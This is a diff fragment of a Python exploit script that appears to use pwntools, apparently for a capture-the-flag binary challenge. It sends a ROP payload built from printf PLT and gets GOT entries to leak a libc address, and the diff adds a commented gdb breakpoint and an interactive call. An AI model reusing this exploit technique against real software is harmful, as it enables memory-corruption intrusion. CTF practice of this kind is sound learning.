@@ -14,8 +14,14 @@ def exploit():
     payload += printf_plt
     payload += main
     payload += gets_got
-    
+
+    #gdb.attach(p, """
+    #            b *main+153
+    #            c
+    #            """)
+
     p.sendline(payload)
+    p.interactive()
     p.recvuntil("-->We've got some Allies!\n")
     
     libc = u32(p.recv(4))
